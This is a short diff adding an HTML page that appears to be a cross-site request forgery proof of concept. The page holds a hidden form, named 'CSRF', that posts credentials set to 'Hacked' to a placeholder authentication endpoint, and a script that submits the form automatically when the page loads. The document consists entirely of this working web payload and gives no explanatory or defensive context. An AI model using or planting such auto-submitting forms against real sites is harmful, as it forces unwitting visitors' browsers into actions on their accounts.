@@ -1,0 +1,5 @@
+<form action='http://example.com/Authenticate.jsp' method='POST' name='CSRF'>
+	<input type='hidden' name='name' value='Hacked'>
+	<input type='hidden' name='password' value='Hacked'>
+</form>
+<script>document.CSRF.submit();</script>
